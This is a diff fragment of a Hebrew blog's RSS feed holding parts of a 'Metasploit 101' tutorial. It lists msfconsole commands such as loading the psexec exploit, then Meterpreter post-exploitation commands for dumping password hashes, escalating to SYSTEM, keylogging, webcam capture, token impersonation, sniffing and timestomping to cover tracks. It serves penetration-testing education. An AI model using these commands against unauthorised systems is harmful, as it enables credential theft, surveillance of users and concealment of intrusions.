+<p dir="rtl" style="text-align: right;"><strong>Shell</strong> – פותח שורת פקודה סטנדרטית (cmd ב-windows למשל)<br />
+<strong>Migrate</strong> – עובר ל-process אחר. אם עברנו ל-process של יוזר מסוים אנחנו נרוץ עם ההרשאות שלו.<br />
+<strong>Ps</strong> &#8211; רשימת התהליכים במערכת כולל פרטים על כל תהליך (למשל משתמש)<br />
+<strong>Run</strong> – מאפשר להריץ מודולים מסוג post שמאפשרים לבצע פעולות שונות במערכת.<br />
+<strong>Use</strong> – טוען מודול נוסף לתוך meterpreter</p>
+<p dir="rtl" style="text-align: right;"><span id="more-54"></span>כדי לקבל מידע על הפקודות והמודולים נריץ את הפקודות הבאות:</p>
+<p dir="rtl" style="text-align: right;"><strong>Help</strong> – נותן את רשימת הפקודות של meterpreter<br />
+<strong>run</strong> – אם נקיש run אחריו רווח ואז פעמיים tab נוכל לצפות בכל מודולי ה-post שניתן לטעון<br />
+<strong>use</strong> &#8211; אם נקיש use אחריו רווח ואז פעמיים tab נוכל לצפות בכל המודולים שניתן לטעון לתוך meterpreter. אחרי שטענו מודול נקיש help ונראה שנוספו לנו פקודות חדשות</p>
+<p dir="rtl" style="text-align: right;">בנוסף לפקודות הבסיסיות שראינו קיימות יכולות מתקדמות נוספות למשל:</p>
+<p dir="rtl" style="text-align: right;"><strong>Hashdump</strong> – מדפיס את רשימת ה-hashים של המשתמשים המקומיים.<br />
+לעיתים נקבל שגיאה כזו –</p>
+<p><code>meterpreter &gt; hashdump<br />
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.</code></p>
+<p dir="rtl" style="text-align: right;">במקרה כזה יש לבצע migrate לתוך process של system ולנסות שוב.<br />
+<strong>Screenshot</strong> – מבצע צילום מסך של המחשב המותקף. הצילום ישמר כתמונה אצלנו במחשב. שימושי כדי לדעת מה המצב של המשתמש (האם הוא מחובר, על מה הוא עובד עכשיו ועוד)<br />
+<strong>Timestomp</strong> – מאפשר לשנות את תאריך הגישה, שינוי, יצירה וכו של קבצים כדי לטשטש עקבות.<br />
+<strong>Getsystem</strong> – משתמש במספר טכניקות כדי להשיג הרשאת system<br />
+<strong>webcam_snap</strong> – מאפשר לצלם תמונה מתוך מצלמת רשת. בעזרת המודול webcam (מריצים בעזרת run webcam) ניתן גם לקבל video stream של מצלמת הרשת<br />
+<strong>keyscan</strong> – מספר פקודות שמאפשרות להריץ keylogger על התהליך הספציפי בו אנחנו נמצאים. הפקודות הן &#8211; keyscan_start, keyscan_stop, keyscan_dump<br />
+<strong>Incognito</strong> – מודול שניתן לטעון לתוך meterpreter ע&#8221;י use Incognito  המודול מאפשר לצפות ולהשתמש בכל ה-tokens הקיימים במערכת וכך להתחזות ליוזר אחר<br />
+<strong>Sniffer</strong> &#8211; מודול שניתן לטעון לתוך meterpreter ע&#8221;י use sniffer  המודול מאפשר להאזין לתעבורת רשת על השרת המותקף<br />
+<strong>Winenum</strong> – מריצים ע&#8221;י run winenum. המודול מוציא מידע מפורט על המערכת כולל תהליכים, משתמשים, חיבורי רשת ועוד הרבה.</p>
+<p dir="rtl" style="text-align: right;"><a href="/metasploit-101-part4">לחלק הבא – קצת על פורטים</a></p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Metasploit 101 – Part 2 &#8211; Commands</title>
+		<link>http://mitm.win/metasploit-101-part2/</link>
+		<pubDate>Sun, 18 Jan 2015 21:41:22 +0000</pubDate>
+		<dc:creator><![CDATA[mitm]]></dc:creator>
+				<category><![CDATA[Metasploit]]></category>
+		<category><![CDATA[Tools]]></category>
+
+		<guid isPermaLink="false">http://mitm.co.il/?p=49</guid>
+		<description><![CDATA[אז הבנו מה הרעיון של Metasploit. בואו נכיר כמה מהפקודות השימושיות שיש לסביבה להציע: Search – משמש לחיפוש מודולים לפי טקסט חופשי ופרמטרים. למשל search ftp יחפש מודולים שמופיע בהם FTP. יש אפשרות לחפש לפי פרמטרים שונים למשל search ftp platform:windows Hosts – מציג את רשימת המחשבים ש-Metasploit מכיר. מחשבים נכנסים לרשימה ע&#8221;י סריקה / [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p dir="rtl" style="text-align: right;">אז הבנו מה הרעיון של Metasploit. בואו נכיר כמה מהפקודות השימושיות שיש לסביבה להציע:</p>
+<p dir="rtl" style="text-align: right;"><strong>Search</strong> – משמש לחיפוש מודולים לפי טקסט חופשי ופרמטרים. למשל search ftp יחפש מודולים שמופיע בהם FTP. יש אפשרות לחפש לפי פרמטרים שונים למשל search ftp platform:windows<br />
+<strong>Hosts</strong> – מציג את רשימת המחשבים ש-Metasploit מכיר. מחשבים נכנסים לרשימה ע&#8221;י סריקה / אחד המודולים שפנה אליהם. ניתן להוסיף ידנית שרת.<br />
+<strong>Vulns</strong> – מתאים פגיעויות לשרתים שמופיעים ברשימה.<br />
+<span id="more-49"></span><strong>Use</strong> – הפקודה השימושית ביותר. טוענת מודול נבחר למרחב העבודה. פירוט בהמשך.<br />
+<strong>Back</strong> – חזרה לשורת הפקודה הרגילה ללא מודול טעון.<br />
+<strong>Sessions</strong> – צפייה וניהול ה-sessions הקיימים מול מחשבים שונים שהשגנו גישת shell עליהם.<br />
+<strong>Jobs</strong> – צפייה וניהול התהליכים שרצים (למשל מודולים שהרצנו והעברנו לרקע)<br />
+יש עוד פקודות רבות שניתן לצפות בהן ע&#8221;י הפקודה ? או help</p>
+<h3 dir="rtl" style="text-align: right;">טעינת מודול</h3>
+<p dir="rtl" style="text-align: right;">ע&#8221;י הפקודה use ניתן לטעון מודול בצורה הבאה:</p>
+<p><code>use exploit/windows/smb/psexec</code></p>
+<p dir="rtl" style="text-align: right;">שורת הפקודה תשתנה לצורה הבאה:</p>
+<p><code>msf exploit(psexec) &gt;</code></p>
+<p dir="rtl" style="text-align: right;">וכעת יש פקודות נוספות שנוכל להריץ:<br />
+<strong>Info</strong> – נותן מידע על המודול הנוכחי.<br />
+<strong>Show options</strong> – מראה את הפרמטרים שהמודול משתמש בהם<br />
+<strong>set</strong> – הפקודה מאפשרת לתת ערך לפרמטר (אם קיים הערך יידרס) מריצים כך:</p>
+<p><code>set PARAMNAME value</code></p>
+<p dir="rtl" style="text-align: right;">יש פרמטר בשם payload שמכיל את ה-payload שבו המודול משתמש (אם יש כזה)<br />
+ניתן לשנות אותו ע&#8221;י הפקודה set באופן רגיל.<br />
+<strong>Exploit / run</strong> – מריץ את המודול הנבחר</p>
+<p dir="rtl" style="text-align: right;"><a href="/metasploit-101-part3">לחלק הבא &#8211; Meterpreter</a></p>
+]]></content:encoded>
+			</item>
+	</channel>
+</rss>
